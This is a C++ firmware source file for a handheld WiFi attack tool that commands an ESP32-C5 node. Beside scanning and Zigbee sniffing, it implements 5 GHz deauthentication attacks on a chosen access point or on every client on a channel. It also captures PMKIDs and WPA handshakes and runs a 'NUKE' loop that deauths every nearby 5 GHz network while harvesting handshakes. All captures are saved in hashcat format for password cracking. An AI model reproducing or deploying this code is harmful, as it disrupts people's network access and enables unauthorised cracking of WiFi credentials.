/*
 * c5_scan — drive a C5 node to do a dual-band WiFi scan and display
 * the results. Also shows the C5 connection status indicator.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "c5_cmd.h"
#include "ble_db.h"
#include "sd_helper.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>

/* Short 4-char auth string for list rendering. Matches ESP-IDF's
 * wifi_auth_mode_t enum ordering. PMF-implying modes (WPA3, W23, W3X)
 * mean deauth frames will be ignored by the client — visible cue that
 * the attack won't land. */
static const char *auth_short(uint8_t a)
{
    switch (a) {
    case 0:  return "OPN ";   /* WIFI_AUTH_OPEN */
    case 1:  return "WEP ";
    case 2:  return "WPA ";
    case 3:  return "WPA2";
    case 4:  return "W12 ";   /* WPA/WPA2 mixed */
    case 5:  return "EAP ";
    case 6:  return "WPA3";   /* PMF mandatory */
    case 7:  return "W23 ";   /* WPA2/WPA3 mixed, PMF optional */
    case 8:  return "WAPI";
    case 9:  return "OWE ";
    case 10: return "EAP3";
    case 11: return "W3X ";
    case 12: return "W3M ";
    default: return "??  ";
    }
}

static void draw_status_header(void)
{
    /* Called from every C5 feature's render tick (300–500 ms). Without
     * this cache the status dot + peer count text repaints every frame
     * even when the peer count hasn't changed — visible as a flash on
     * every live screen. Invalidate by passing -1 / resetting last_n
     * when transitioning to a new C5 screen. */
    static int     last_n = -1;
    static uint16_t last_col = 0;
    auto &d = M5Cardputer.Display;
    int n = c5_peer_count();
    uint16_t col = n > 0 ? T_GOOD : T_BAD;
    if (n == last_n && col == last_col) return;
    last_n = n; last_col = col;

    d.fillCircle(SCR_W - 10, 6, 3, col);  /* status dot */
    d.setTextColor(col, 0x0841);
    /* Clear the text band first so old digits don't shadow through. */
    d.fillRect(SCR_W - 60, 2, 45, 8, 0x0841);
    d.setCursor(SCR_W - 60, 2);
    if (n == 0) d.print("no C5");
    else        d.printf("C5 x%d", n);
}

void feat_c5_status(void)
{
    Serial.println("[c5_status] enter");
    radio_switch(RADIO_WIFI);
    Serial.println("[c5_status] radio_switch OK");
    c5_begin();
    Serial.println("[c5_status] c5_begin OK");

    auto &d = M5Cardputer.Display;
    ui_draw_footer("P=ping  S=stop  `=back");

    uint32_t last = 0;
    uint32_t frame = 0;
    while (true) {
        if (millis() - last > 400) {
            last = millis();
            ++frame;

            /* Snapshot once. No further live reads during this frame. */
            int n = c5_peer_count();
            if (n > 6) n = 6;
            char names[6][16];
            for (int i = 0; i < n; ++i) c5_peer_name_copy(i, names[i], sizeof(names[i]));
            uint32_t age_ms = (n > 0) ? c5_last_seen_ms() : 0;

            if ((frame & 7) == 0) Serial.printf("[c5_status] frame=%lu n=%d\n",
                                                (unsigned long)frame, n);

            ui_clear_body();
            d.setTextColor(0xF81F, T_BG);
            d.setCursor(4, BODY_Y + 2); d.print("C5 NODES");
            d.drawFastHLine(4, BODY_Y + 12, 80, 0xF81F);
            if (n == 0) {
                d.setTextColor(T_BAD, T_BG);
                d.setCursor(4, BODY_Y + 24); d.print("NO C5 ONLINE");
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(4, BODY_Y + 38); d.print("power on your C5 node.");
                d.setCursor(4, BODY_Y + 48); d.print("it broadcasts HELLO every 5s.");
                d.setCursor(4, BODY_Y + 58); d.print("will auto-connect.");
            } else {
                d.setTextColor(T_GOOD, T_BG);
                d.setCursor(4, BODY_Y + 22);
                d.printf("ONLINE  %d peer%s", n, n == 1 ? "" : "s");
                for (int i = 0; i < n; ++i) {
                    d.setTextColor(T_FG, T_BG);
                    d.setCursor(8, BODY_Y + 36 + i * 10);
                    d.printf("* %s", names[i]);
                }
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(4, BODY_Y + BODY_H - 10);
                d.printf("last seen: %lus ago", (unsigned long)(age_ms / 1000));
            }
            draw_status_header();
            ui_radar(SCR_W - 20, BODY_Y + BODY_H - 14, 8, T_ACCENT);
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(40); continue; }
        if (k == PK_ESC) break;
        if (k == 'p' || k == 'P') { c5_cmd_ping(); ui_toast("ping sent", T_ACCENT, 400); }
        if (k == 's' || k == 'S') { c5_cmd_stop(); ui_toast("stop sent", T_WARN, 400); }
    }
    Serial.println("[c5_status] exit");
}

void feat_c5_scan_5g(void)
{
    radio_switch(RADIO_WIFI);
    c5_begin();

    if (!c5_any_online()) {
        ui_toast("no C5 online", T_BAD, 1500);
        return;
    }
    c5_clear_results();
    c5_cmd_scan_5g(300);

    auto &d = M5Cardputer.Display;
    ui_clear_body();  /* one-time entry clear */
    ui_draw_footer(";/. move  R=rescan  `=back");
    int cursor = 0;
    int last_n = -1;
    uint32_t last = 0;
    while (true) {
        if (millis() - last > 300) {
            last = millis();
            int n_now = c5_aps(nullptr, 0);
            bool new_result = (n_now != last_n);
            last_n = n_now;
            char title[40];
            snprintf(title, sizeof(title), "DUAL-BAND %d (raw %lu/%lu)",
                     n_now,
                     (unsigned long)c5_dbg_raw_ap_records(),
                     (unsigned long)c5_dbg_resp_ap_frames());
            ui_dashboard_chrome(title, new_result);
            /* Wipe only the AP-list region so the rows redraw clean
             * without flashing the whole body. */
            d.fillRect(0, BODY_Y + 14, SCR_W, BODY_H - 28, T_BG);
            draw_status_header();
            ui_freq_bars(SCR_W - 58, BODY_Y + 2, 3, 10);

            c5_ap_t aps[64];
            int n = c5_aps(aps, 64);
            /* Sort by RSSI descending (bubble — n is small). */
            for (int i = 1; i < n; ++i) {
                for (int j = 0; j < n - i; ++j) {
                    if (aps[j].rssi < aps[j + 1].rssi) {
                        c5_ap_t t = aps[j]; aps[j] = aps[j + 1]; aps[j + 1] = t;
                    }
                }
            }

            if (n == 0) {
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(4, BODY_Y + 24);
                d.print("waiting for C5 response...");
                ui_radar(SCR_W / 2, BODY_Y + 60, 25, 0x07FF);
            } else {
                int rows = 7;
                if (cursor < 0) cursor = 0;
                if (cursor >= n) cursor = n - 1;
                int first = cursor - rows / 2;
                if (first < 0) first = 0;
                if (first + rows > n) first = max(0, n - rows);
                for (int r = 0; r < rows && first + r < n; ++r) {
                    int i = first + r;
                    const c5_ap_t &a = aps[i];
                    int y = BODY_Y + 18 + r * 12;
                    bool sel = (i == cursor);
                    if (sel) d.fillRect(0, y - 1, SCR_W, 12, 0x3007);
                    uint16_t rowbg = sel ? 0x3007 : T_BG;
                    /* Band badge. */
                    d.setTextColor(a.is_5g ? 0xF81F : T_ACCENT, rowbg);
                    d.setCursor(2, y);
                    d.print(a.is_5g ? "5G" : "2G");
                    /* RSSI */
                    d.setTextColor(sel ? 0xFFFF : T_FG, rowbg);
                    d.setCursor(20, y);
                    d.printf("%4d", a.rssi);
                    /* Auth — highlight PMF-implying modes in red so
                     * the operator sees at a glance deauth won't work. */
                    bool pmf = (a.auth == 6 || a.auth == 10 || a.auth == 11);
                    d.setTextColor(pmf ? T_BAD : T_WARN, rowbg);
                    d.setCursor(48, y);
                    d.print(auth_short(a.auth));
                    /* Channel */
                    d.setTextColor(T_DIM, rowbg);
                    d.setCursor(78, y);
                    d.printf("%u", a.channel);
                    /* SSID */
                    d.setTextColor(sel ? T_ACCENT : T_FG, rowbg);
                    d.setCursor(100, y);
                    d.printf("%.22s", a.ssid[0] ? a.ssid : "<hidden>");
                }
            }
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(40); continue; }
        if (k == PK_ESC) break;
        if (k == ';' || k == PK_UP)   { if (cursor > 0) cursor--; }
        if (k == '.' || k == PK_DOWN) { cursor++; }
        if (k == 'r' || k == 'R') { c5_clear_results(); c5_cmd_scan_5g(300); }
    }
}

/* ==================== C5 5 GHz Deauth ==================== */

void feat_c5_deauth_5g(void)
{
    radio_switch(RADIO_WIFI);
    c5_begin();
    if (!c5_any_online()) { ui_toast("no C5 online", T_BAD, 1500); return; }

    /* Use the dual-band scan results if available; else trigger one. */
    c5_ap_t aps[64];
    int n = c5_aps(aps, 64);
    if (n == 0) {
        c5_clear_results();
        c5_cmd_scan_5g(400);
        ui_toast("scanning first...", T_ACCENT, 1200);
        delay(1500);
        n = c5_aps(aps, 64);
    }
    /* Filter to 5 GHz only. */
    int five_n = 0;
    for (int i = 0; i < n; ++i) if (aps[i].is_5g) aps[five_n++] = aps[i];
    n = five_n;
    if (n == 0) {
        ui_toast("no 5 GHz APs found", T_WARN, 1500);
        return;
    }

    /* Cursor select target. */
    int cursor = 0;
    auto &d = M5Cardputer.Display;
    ui_draw_footer(";/. pick  ENTER=fire  X=all on ch  `=back");
    bool picking = true;
    int chosen = -1;
    while (picking) {
        ui_clear_body();
        d.setTextColor(T_ACCENT2, T_BG);
        d.setCursor(4, BODY_Y + 2); d.print("PICK 5 GHz TARGET");
        d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT2);
        int rows = 7;
        if (cursor < 0) cursor = 0;
        if (cursor >= n) cursor = n - 1;
        int first = cursor - rows / 2;
        if (first < 0) first = 0;
        if (first + rows > n) first = (n > rows) ? (n - rows) : 0;
        for (int r = 0; r < rows && first + r < n; ++r) {
            int i = first + r;
            const c5_ap_t &a = aps[i];
            int y = BODY_Y + 18 + r * 12;
            bool sel = (i == cursor);
            if (sel) d.fillRect(0, y - 1, SCR_W, 12, 0x3007);
            d.setTextColor(sel ? T_ACCENT : T_FG, sel ? 0x3007 : T_BG);
            d.setCursor(2, y);
            d.printf("%4d ch%-3u %.20s", a.rssi, a.channel,
                     a.ssid[0] ? a.ssid : "<hidden>");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(30); continue; }
        if (k == PK_ESC) return;
        if (k == ';' || k == PK_UP)   { if (cursor > 0) cursor--; }
        if (k == '.' || k == PK_DOWN) { cursor++; }
        if (k == PK_ENTER) { chosen = cursor; picking = false; break; }
        if (k == 'x' || k == 'X') {
            /* Deauth everyone on the selected target's channel. */
            uint8_t zero[6] = {0};
            uint8_t ch = aps[cursor].channel;
            c5_cmd_deauth(zero, ch, 1, 8000);
            picking = false;
            chosen = -2;  /* marker: bcast-all */
        }
    }

    /* Live attack dashboard. */
    uint16_t dur = 8000;
    uint8_t attack_ch = (chosen == -2) ? aps[cursor].channel : aps[chosen].channel;
    if (chosen >= 0) {
        c5_cmd_deauth(aps[chosen].bssid, aps[chosen].channel, 0, dur);
    }
    /* ESP32-S3 radio cannot tune to 5 GHz channels — esp_wifi_set_channel
     * returns ESP_ERR_WIFI_IF (258). We can't follow the C5 to its attack
     * channel. Instead, C5 hops to ch 1 briefly to send each RESP_STATUS
     * (see wifi_attacker.c:send_status), so POSEIDON on ch 1 receives
     * them normally. No channel switch here. */
    const char *mode = (chosen == -2) ? "5G NUKE-CH" : "5G DEAUTH";
    uint32_t end = millis() + dur + 1500;
    uint32_t last = 0;
    uint32_t last_frames = 0;
    ui_clear_body();  /* ONE-TIME wipe on entry — after this, only the
                         status region gets redrawn. No per-frame full
                         clear → no flashing. */
    ui_draw_footer("`=stop");
    while (millis() < end) {
        if (millis() - last > 200) {
            last = millis();
            uint32_t now_frames = c5_status_frames();
            bool tick = (now_frames != last_frames);
            last_frames = now_frames;
            ui_dashboard_chrome(mode, tick);
            /* Wipe ONLY the status text region so changing values don't
             * leave leftover glyphs behind. Hex stream above + below
             * animates smoothly underneath. */
            d.fillRect(0, BODY_Y + 14, SCR_W, BODY_H - 28, T_BG);
            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 16);
            if (chosen == -2) {
                d.printf("ALL on ch%u", c5_status_channel());
            } else {
                const c5_ap_t &a = aps[chosen];
                d.printf("%.22s", a.ssid[0] ? a.ssid : "<hidden>");
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(4, BODY_Y + 28);
                d.printf("ch%u  %02X:%02X:%02X:%02X:%02X:%02X",
                         a.channel,
                         a.bssid[0], a.bssid[1], a.bssid[2],
                         a.bssid[3], a.bssid[4], a.bssid[5]);
            }
            /* While C5 is hammering TX on the attack channel, its
             * RESP_STATUS packets get squeezed by the TX queue and
             * arrive in bursts, not smoothly. Show "LIVE" until we
             * actually receive a non-zero count so the operator doesn't
             * think nothing's happening. */
            d.setTextColor(T_ACCENT, T_BG);
            d.setCursor(4, BODY_Y + 44);
            if (now_frames > 0)
                d.printf("frames: %lu", (unsigned long)now_frames);
            else
                d.print("ATTACK LIVE (count lags)");
            d.setCursor(4, BODY_Y + 56);
            uint32_t left = (end - millis()) / 1000;
            d.printf("time  : %lus", (unsigned long)left);
            ui_freq_bars(SCR_W - 70, BODY_Y + 16, 4, 36);
            ui_draw_status(radio_name(), "C5-DAUTH");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) { c5_cmd_stop(); break; }
    }
}

void feat_c5_scan_zb(void)
{
    radio_switch(RADIO_WIFI);
    c5_begin();
    if (!c5_any_online()) { ui_toast("no C5 online", T_BAD, 1500); return; }

    c5_clear_results();
    c5_cmd_scan_zb(0xFF);  /* hop all channels 11-26 */

    auto &d = M5Cardputer.Display;
    ui_clear_body();
    ui_draw_footer("`=back");
    int last_n = -1;
    uint32_t last = 0;
    while (true) {
        if (millis() - last > 300) {
            last = millis();
            c5_zb_t probe[1];
            int n_now = c5_zbs(probe, 0);
            bool new_frame = (n_now != last_n);
            last_n = n_now;
            ui_dashboard_chrome("C5 ZIGBEE SNIFF", new_frame);
            /* Wipe only the frames/status zone — hex stream self-clears. */
            d.fillRect(0, BODY_Y + 14, SCR_W, BODY_H - 28, T_BG);
            draw_status_header();
            ui_freq_bars(SCR_W - 58, BODY_Y + 2, 3, 10);

            c5_zb_t z[32];
            int n = c5_zbs(z, 32);
            if (n == 0) {
                /* Live "still alive" indicator — we have no frames but
                 * the C5 IS hopping. Show simulated channel hop and a
                 * pulse so silence reads as "no traffic" not "broken". */
                uint8_t hop_ch = 11 + ((millis() / 500) % 16);  /* 11..26 */
                d.setTextColor(T_ACCENT, T_BG);
                d.setCursor(4, BODY_Y + 24);
                d.printf("hopping ch%u", hop_ch);
                d.setTextColor(T_DIM, T_BG);
                d.setCursor(4, BODY_Y + 38);
                d.print("listening on 802.15.4...");
                d.setCursor(4, BODY_Y + 52);
                d.print("(zigbee/thread/matter — silent");
                d.setCursor(4, BODY_Y + 62);
                d.print(" until a device transmits)");
                /* Hop progress bar — fills 0->15 over the channel range. */
                int bar = ((hop_ch - 11) * (SCR_W - 30)) / 15;
                d.fillRect(4, BODY_Y + BODY_H - 18, bar, 3, T_ACCENT);
                d.drawRect(4, BODY_Y + BODY_H - 18, SCR_W - 30, 3, T_DIM);
                /* Pulse dot moving with hop. */
                int px = 4 + bar;
                d.fillCircle(px, BODY_Y + BODY_H - 17, 2, T_ACCENT2);
            } else {
                int rows = 7;
                int first = n > rows ? n - rows : 0;
                for (int r = 0; r < rows && first + r < n; ++r) {
                    const c5_zb_t &e = z[first + r];
                    int y = BODY_Y + 18 + r * 12;
                    d.setTextColor(T_ACCENT, T_BG);
                    d.setCursor(2, y);  d.printf("ch%u", e.channel);
                    d.setTextColor(T_FG, T_BG);
                    d.setCursor(32, y); d.printf("%4d", e.rssi);
                    d.setTextColor(T_WARN, T_BG);
                    d.setCursor(64, y);
                    switch (e.frame_type) {
                    case 0: d.print("BCN "); break;
                    case 1: d.print("DATA"); break;
                    case 2: d.print("ACK "); break;
                    case 3: d.print("CMD "); break;
                    default: d.printf("t%d", e.frame_type);
                    }
                    d.setTextColor(T_FG, T_BG);
                    d.setCursor(102, y);
                    d.printf("PAN%04X src%04X", e.pan_id, e.src_short);
                }
            }
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(40); continue; }
        if (k == PK_ESC) break;
    }
    c5_cmd_stop();
}

/* ==================== C5 5 GHz PMKID capture ==================== */

static void save_hs_to_sd(const c5_hs_t &h)
{
    if (!sd_mount()) return;
    SD.mkdir("/poseidon");
    File f = SD.open("/poseidon/hashcat.22000", FILE_APPEND);
    if (!f) return;
    /* hashcat 22000 WPA*02* format:
     *   WPA*02*<mic>*<bssid>*<sta>*<essid_hex>*<anonce>*<m2_body>*02 */
    f.print("WPA*02*");
    for (int i = 0; i < 16; ++i) f.printf("%02x", h.mic[i]);
    f.print("*");
    for (int i = 0; i < 6;  ++i) f.printf("%02x", h.bssid[i]);
    f.print("*");
    for (int i = 0; i < 6;  ++i) f.printf("%02x", h.sta[i]);
    f.print("*");
    for (int i = 0; i < h.ssid_len && i < 33; ++i) f.printf("%02x", (uint8_t)h.ssid[i]);
    f.print("*");
    for (int i = 0; i < 32; ++i) f.printf("%02x", h.anonce[i]);
    f.print("*");
    int m2 = h.eapol_m2_len > 128 ? 128 : h.eapol_m2_len;
    for (int i = 0; i < m2; ++i) f.printf("%02x", h.eapol_m2[i]);
    f.println("*02");
    f.close();
}

static void save_pmkid_to_sd(const c5_pmkid_t &p)
{
    if (!sd_mount()) return;
    SD.mkdir("/poseidon");
    File f = SD.open("/poseidon/hashcat.22000", FILE_APPEND);
    if (!f) return;
    /* hashcat 22000 WPA*01* format:
     *   WPA*01*<pmkid>*<bssid>*<sta>*<essid_hex>***  */
    f.print("WPA*01*");
    for (int i = 0; i < 16; ++i) f.printf("%02x", p.pmkid[i]);
    f.print("*");
    for (int i = 0; i < 6;  ++i) f.printf("%02x", p.bssid[i]);
    f.print("*");
    for (int i = 0; i < 6;  ++i) f.printf("%02x", p.sta[i]);
    f.print("*");
    if (p.ssid_len > 0) {
        for (int i = 0; i < p.ssid_len && i < 33; ++i) f.printf("%02x", (uint8_t)p.ssid[i]);
    }
    f.println("***");
    f.close();
    Serial.printf("[c5_pmkid] logged PMKID %02x%02x%02x%02x... sta %02X:%02X:%02X\n",
                  p.pmkid[0], p.pmkid[1], p.pmkid[2], p.pmkid[3],
                  p.sta[3], p.sta[4], p.sta[5]);
}

void feat_c5_pmkid_5g(void)
{
    radio_switch(RADIO_WIFI);
    c5_begin();
    if (!c5_any_online()) { ui_toast("no C5 online", T_BAD, 1500); return; }

    /* Prefer existing 5G scan results; else trigger a short one. */
    c5_ap_t aps[64];
    int n = c5_aps(aps, 64);
    if (n == 0) {
        c5_clear_results();
        c5_cmd_scan_5g(400);
        ui_toast("scanning first...", T_ACCENT, 1200);
        delay(1500);
        n = c5_aps(aps, 64);
    }
    int five_n = 0;
    for (int i = 0; i < n; ++i) if (aps[i].is_5g) aps[five_n++] = aps[i];
    n = five_n;
    if (n == 0) { ui_toast("no 5 GHz APs found", T_WARN, 1500); return; }

    /* Target picker. */
    auto &d = M5Cardputer.Display;
    int cursor = 0;
    ui_draw_footer(";/. pick  ENTER=capture  `=back");
    int chosen = -1;
    while (chosen < 0) {
        ui_clear_body();
        d.setTextColor(T_ACCENT2, T_BG);
        d.setCursor(4, BODY_Y + 2); d.print("PMKID 5 GHz — PICK TARGET");
        d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT2);
        int rows = 7;
        if (cursor < 0) cursor = 0;
        if (cursor >= n) cursor = n - 1;
        int first = cursor - rows / 2;
        if (first < 0) first = 0;
        if (first + rows > n) first = (n > rows) ? (n - rows) : 0;
        for (int r = 0; r < rows && first + r < n; ++r) {
            int i = first + r;
            const c5_ap_t &a = aps[i];
            int y = BODY_Y + 18 + r * 12;
            bool sel = (i == cursor);
            if (sel) d.fillRect(0, y - 1, SCR_W, 12, 0x3007);
            d.setTextColor(sel ? T_ACCENT : T_FG, sel ? 0x3007 : T_BG);
            d.setCursor(2, y);
            d.printf("%4d ch%-3u %.20s", a.rssi, a.channel,
                     a.ssid[0] ? a.ssid : "<hidden>");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(30); continue; }
        if (k == PK_ESC) return;
        if (k == ';' || k == PK_UP)   { if (cursor > 0) cursor--; }
        if (k == '.' || k == PK_DOWN) { cursor++; }
        if (k == PK_ENTER) { chosen = cursor; break; }
    }

    /* Fire capture + live dashboard. */
    c5_clear_results();
    uint16_t dur = 15000;
    c5_cmd_pmkid(aps[chosen].bssid, aps[chosen].channel, dur);

    uint32_t end = millis() + dur + 2000;
    uint32_t last = 0;
    int last_count = -1;
    int written = 0;
    ui_clear_body();
    ui_draw_footer("`=stop early");
    while (millis() < end) {
        if (millis() - last > 250) {
            last = millis();
            c5_pmkid_t buf[16];
            int got = c5_pmkids(buf, 16);
            bool tick = (got != last_count);
            last_count = got;

            /* Flush new captures to SD. */
            while (written < got) {
                save_pmkid_to_sd(buf[written]);
                written++;
            }

            ui_dashboard_chrome("C5 PMKID 5G", tick);
            /* Wipe only the status region — hex stream self-clears. */
            d.fillRect(0, BODY_Y + 14, SCR_W, BODY_H - 28, T_BG);
            draw_status_header();
            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 18);
            d.printf("%.22s", aps[chosen].ssid[0] ? aps[chosen].ssid : "<hidden>");
            d.setTextColor(T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 30);
            d.printf("ch%u  %02X:%02X:%02X:%02X:%02X:%02X",
                     aps[chosen].channel,
                     aps[chosen].bssid[0], aps[chosen].bssid[1],
                     aps[chosen].bssid[2], aps[chosen].bssid[3],
                     aps[chosen].bssid[4], aps[chosen].bssid[5]);
            uint16_t col = got > 0 ? T_GOOD : T_ACCENT;
            d.setTextColor(col, T_BG);
            d.setCursor(4, BODY_Y + 46);
            d.printf("PMKIDs  : %d", got);
            d.setTextColor(T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 58);
            uint32_t left = (end > millis()) ? (end - millis()) / 1000 : 0;
            d.printf("time    : %lus  -> hashcat.22000", (unsigned long)left);
            ui_freq_bars(SCR_W - 70, BODY_Y + 16, 4, 36);
            ui_draw_status(radio_name(), "C5-PMKID");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) { c5_cmd_stop(); break; }
    }

    /* Final flush + summary. */
    c5_pmkid_t buf[16];
    int got = c5_pmkids(buf, 16);
    while (written < got) { save_pmkid_to_sd(buf[written]); written++; }
    if (written > 0) {
        char msg[40];
        snprintf(msg, sizeof(msg), "captured %d -> SD", written);
        ui_toast(msg, T_GOOD, 1200);
    } else {
        ui_toast("no PMKID (try deauth first)", T_WARN, 1500);
    }
}

/*
 * feat_c5_nuke_5g — NUKE-ALL for the 5 GHz band via TRIDENT.
 *
 * Rotates through every 5 GHz AP the C5 has seen, firing:
 *   (1) c5_cmd_hs(bssid, channel, 5000)   — promisc listen for M1/M2
 *   (2) c5_cmd_deauth(bssid, channel, 0, 4000) — force re-auth storm
 *
 * The HS capture runs concurrently with the deauth on the C5 side —
 * it's already listening when clients re-auth after getting kicked.
 * Anything caught streams back as RESP_HS and gets written to
 * /poseidon/hashcat.22000 in WPA*02* format. PMKIDs from the same
 * target (if any) flush through the same loop.
 *
 * Runs until ESC. No time-slicing with the S3 side — this is the
 * dedicated C5-only path.
 */
void feat_c5_nuke_5g(void)
{
    radio_switch(RADIO_WIFI);
    c5_begin();
    if (!c5_any_online()) { ui_toast("no C5 online", T_BAD, 1500); return; }

    /* Initial scan to populate the 5G target list. */
    c5_clear_results();
    c5_cmd_scan_5g(800);
    ui_toast("scanning 5 GHz...", T_ACCENT, 1200);
    delay(1800);

    c5_ap_t aps[64];
    int n = c5_aps(aps, 64);
    int five_n = 0;
    for (int i = 0; i < n; ++i) if (aps[i].is_5g) aps[five_n++] = aps[i];
    if (five_n == 0) { ui_toast("no 5 GHz APs found", T_WARN, 1500); return; }

    auto &d = M5Cardputer.Display;
    int cursor = 0;
    uint32_t last = 0;
    uint32_t last_rotate = 0;
    int hs_written = 0;
    int pmk_written = 0;
    uint32_t last_rescan = millis();

    ui_draw_footer("`=stop   deauth-all + HS capture loop");
    while (true) {
        uint32_t now = millis();

        /* Rotate every 6 s so each C5 command has room to finish. */
        if (now - last_rotate > 6000) {
            last_rotate = now;
            const c5_ap_t &t = aps[cursor % five_n];
            c5_cmd_hs(t.bssid, t.channel, 5000);
            c5_cmd_deauth(t.bssid, t.channel, 0, 4000);
            cursor++;

            /* Rescan every 45 s in case the target set moved. */
            if (now - last_rescan > 45000) {
                last_rescan = now;
                c5_cmd_scan_5g(400);
            }
        }

        /* Every 300 ms: refresh the target list (in case a scan just
         * landed), drain any HS / PMKID captures into the hashcat log,
         * paint the dashboard. */
        if (now - last > 300) {
            last = now;
            int fresh_n = c5_aps(aps, 64);
            int fresh_5 = 0;
            for (int i = 0; i < fresh_n; ++i)
                if (aps[i].is_5g) aps[fresh_5++] = aps[i];
            if (fresh_5 > 0) five_n = fresh_5;

            c5_hs_t hs[8];
            int got_hs = c5_hss(hs, 8);
            while (hs_written < got_hs) {
                save_hs_to_sd(hs[hs_written]);
                hs_written++;
            }
            c5_pmkid_t pm[8];
            int got_pm = c5_pmkids(pm, 8);
            while (pmk_written < got_pm) {
                save_pmkid_to_sd(pm[pmk_written]);
                pmk_written++;
            }

            /* Keep the NUKE splash aesthetic for this screen too. */
            d.fillScreen(0x0000);
            ui_glitch(0, 0, SCR_W, SCR_H);
            for (int y = 0; y < SCR_H; y += 4)
                d.drawFastHLine(0, y, SCR_W, 0x0020);

            const char *headline = "5 GHz NUKE";
            d.setTextSize(3);
            int hw = d.textWidth(headline) * 3;
            int hx = (SCR_W - hw) / 2;
            int hy = 22;
            d.setTextColor(0xF81F, 0);
            d.setCursor(hx - 2, hy); d.print(headline);
            d.setCursor(hx + 2, hy); d.print(headline);
            d.setCursor(hx, hy - 2); d.print(headline);
            d.setCursor(hx, hy + 2); d.print(headline);
            d.setTextColor(0xFFFF, 0);
            d.setCursor(hx, hy); d.print(headline);
            d.setTextSize(1);

            /* Green C5 indicator top-left. */
            d.fillCircle(7, 6, 2, 0x07E0);
            d.setTextColor(0x07E0, 0);
            d.setCursor(13, 2); d.print("C5");

            /* Target + stats. */
            const c5_ap_t &t = aps[(cursor ? cursor - 1 : 0) % five_n];
            d.setTextColor(0x07FF, 0);
            d.setCursor(4, SCR_H - 44);
            d.printf("-> %.20s", t.ssid[0] ? t.ssid : "<hidden>");
            d.setTextColor(0x8410, 0);
            d.setCursor(4, SCR_H - 34);
            d.printf("ch%u %02X:%02X:%02X:%02X:%02X:%02X",
                     t.channel, t.bssid[0], t.bssid[1], t.bssid[2],
                     t.bssid[3], t.bssid[4], t.bssid[5]);

            char row1[48], row2[48];
            snprintf(row1, sizeof(row1), "%d APs  HS:%d  PMKID:%d",
                     five_n, hs_written, pmk_written);
            snprintf(row2, sizeof(row2), "rotation %d", cursor);
            d.setTextColor(hs_written > 0 ? 0x07E0 : 0xFFE0, 0);
            int w1 = d.textWidth(row1);
            d.setCursor((SCR_W - w1) / 2, SCR_H - 22);
            d.print(row1);
            d.setTextColor(0xFFFF, 0);
            int w2 = d.textWidth(row2);
            d.setCursor((SCR_W - w2) / 2, SCR_H - 10);
            d.print(row2);
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
    }
    c5_cmd_stop();
    if (hs_written > 0 || pmk_written > 0) {
        char msg[48];
        snprintf(msg, sizeof(msg), "saved %d HS, %d PMKID",
                 hs_written, pmk_written);
        ui_toast(msg, T_GOOD, 1500);
    }
}
